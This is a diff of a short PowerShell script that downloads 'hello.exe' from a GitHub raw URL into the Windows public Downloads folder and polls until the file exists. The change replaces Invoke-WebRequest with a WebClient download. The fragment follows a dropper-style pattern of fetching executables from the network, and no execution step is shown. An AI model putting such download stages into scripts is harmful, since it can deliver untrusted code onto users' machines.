@@ -1,7 +1,8 @@
 $downloadUrl = "https://raw.githubusercontent.com/Eric970619/page/main/hello.exe"
 $destinationPath = "C:\Users\Public\Downloads\hello.exe"
-$ProgressPreference = 'SilentlyContinue'
-Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath
+
+$wc = New-Object System.Net.WebClient
+$wc.DownloadFile($downloadUrl, $destinationPath)
 
 while (-not (Test-Path $destinationPath)) {
     Start-Sleep -Seconds 1
